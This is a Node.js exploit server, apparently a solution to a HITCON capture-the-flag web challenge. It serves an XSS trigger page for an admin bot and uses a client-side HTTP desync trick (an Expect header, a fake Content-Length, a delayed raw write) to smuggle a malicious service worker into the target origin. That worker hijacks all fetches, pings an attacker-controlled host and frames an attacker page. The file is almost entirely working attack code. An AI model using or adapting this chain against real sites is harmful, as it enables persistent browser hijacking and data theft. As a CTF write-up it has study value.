const http = require('http')
const crypto = require('crypto')

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms))

const PUBLIC_URL = 'http://PUBLIC_IP_OR_HOST:1337' // public url to this server, no trailing slash
const ROUTE_NAME = 'wwwwwwwww' // assuming /~wwwwwwwww/ maps to this server

http.createServer(async (req, res) => {
	if (!req.socket.id) {
		req.socket.id = crypto.randomUUID().slice(0, 8)
		console.log('connected', req.socket.id)
		req.socket.on('close', () => {
			console.log('close', req.socket.id)
		})
	} else {
		console.log('reused', req.socket.id)
	}
	console.log(req.socket.id, req.url)
	const url = new URL(req.url, 'http://localhost')

	if (url.pathname === '/trigger') {
		// send this url to xss bot
		res.writeHead(200, { 'content-type': 'text/html' })
		res.end(`
<script>
	const sleep = ms => new Promise(resolve => setTimeout(resolve, ms))
	;(async ()=>{
		w = open('http://web:3000/~${ROUTE_NAME}/')
		await sleep(500)
		w.location = 'about:blank'
		await sleep(100)
		w.history.back(1)
	})()
</script>
<img src="/sleep">
`)
		return
	}

	if (url.pathname === '/') {
		res.writeHead(200, { 'content-type': 'text/html' })
		res.end(`
<script src="xss.js?v1"></script>
<script src="xss.js?v2"></script>
<script src="xss.js?v3"></script>
<script src="xss.js?v4"></script>
<script src="xss.js?v5"></script>
<script src="xss.js?v6"></script>
<script src="xss.js?v7"></script>
<script src="xss.js?v8"></script>
		`)
		return
	}

	if (url.pathname === '/xss.js') {
		const js = `
;(async () => {
	if (window.running) {
		console.log('already running another xss')
		return
	}
	window.running = true
	console.log('xss', origin)
	const fetchsw = () => fetch('sw.js').then(r => false)
	const regsw = () => navigator.serviceWorker.register('sw.js', { scope: '/' })
		.then(reg => {
			console.log('Service Worker Registered', reg)
			return true
		})
		.catch(e => {
			console.error('Service Worker Registration Failed', e)
			return false
		})
	while (true) {
		const ps = Array.from({ length: 10 }, fetchsw)
		const success = await regsw()
		if (success) break
		await Promise.all(ps)
	}
	document.write('Service Worker Registered')
	await new Promise(resolve => setTimeout(resolve, 1000))
	location = '/~note/'
})()
`
		const resp = `
HTTP/1.1 200 OK\r
Content-Type: text/javascript\r
Content-Length: ${js.length}\r
Connection: keep-alive\r
\r
${js}`.slice(1)
		res.writeHead(200, {
			'content-type': 'not/script', // triggers "block scripts just in case" (Content-Length: 0) but still can't be registered as service worker
			'content-length': resp.length,
			// node will flush header when sending `Expect` header
			// see: https://github.com/nodejs/node/blob/ed6f45bef86134533550924baa89fd92d5b24f78/lib/_http_outgoing.js#L587
			// this is to prevent chromium dropping connection when it detect extraneous response
			expect: '100-continue'
		})
		res.flushHeaders()
		await sleep(1000) // wait for the server the send the header first
		// to node, this will still be sent to the browser
		// but for browser, Content-Length: 0 tells it to ignore the response
		// the delay is to the make make think this is the response of the next request on the same connection
		res.socket.write(resp)
		res.end()
		return
	}

	if (url.pathname === '/sw.js') {
		const js = `
addEventListener('install', e => {
	self.skipWaiting()
})

addEventListener('activate', e => {
	clients.claim()
})

addEventListener('fetch', e => {
	fetch('${PUBLIC_URL}/hijack_success')
	e.respondWith(new Response('<iframe src="${PUBLIC_URL}/frame"></iframe>', {
		headers: {
			'content-type': 'text/html'
		}
	}))
})
`
		const resp = `
HTTP/1.1 200 OK\r
Content-Type: text/javascript\r
Content-Length: ${js.length}\r
Service-Worker-Allowed: /\r
Connection: keep-alive\r
\r
${js}`.slice(1)
		res.writeHead(200, {
			'content-type': 'not/script', // triggers "block scripts just in case" (Content-Length: 0) but still can't be registered as service worker
			'content-length': resp.length,
			// node will flush header when sending `Expect` header
			// see: https://github.com/nodejs/node/blob/ed6f45bef86134533550924baa89fd92d5b24f78/lib/_http_outgoing.js#L587
			// this is to prevent chromium dropping connection when it detect extraneous response
			expect: '100-continue'
		})
		res.flushHeaders()
		await sleep(1000) // wait for the server the send the header first
		// to node, this will still be sent to the browser
		// but for browser, Content-Length: 0 tells it to ignore the response
		// the delay is to the make make think this is the response of the next request on the same connection
		res.socket.write(resp)
		res.end()
		return
	} else if (url.pathname === '/sleep') {
		await sleep(15000)
		res.writeHead(200)
		res.end()
		return
	} else if (url.pathname === '/frame') {
		res.writeHead(200, { 'content-type': 'text/html' })
		res.end(`
<form action="/flag" method="GET">
	<textarea name="flag"></textarea>
	<button>Submit</button>
</form>
		`)
		return
	}
	res.writeHead(404)
	res.end()
}).listen(1337)
// hitcon{chaining_known_browser_features_and_exploiting_client_side_desync}
